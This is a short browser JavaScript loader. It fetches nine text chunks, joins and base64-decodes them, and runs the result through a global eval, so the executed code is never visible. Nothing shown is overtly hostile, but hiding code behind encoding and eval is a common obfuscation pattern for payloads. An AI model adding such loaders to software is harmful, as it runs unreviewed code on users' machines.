(async()=>{
const n=9;
const parts=[];
for(let i=0;i<n;i++){
  const t=await fetch('./p'+i+'.txt').then(r=>{if(!r.ok)throw new Error('p'+i);return r.text();});
  parts.push(t.trim());
}
const bin=Uint8Array.from(atob(parts.join('')),c=>c.charCodeAt(0));
(0,eval)(new TextDecoder().decode(bin));
})().catch(e=>{console.error(e);document.body.innerHTML='<pre style="color:#fff;padding:20px">Load error: '+e+'</pre>';});
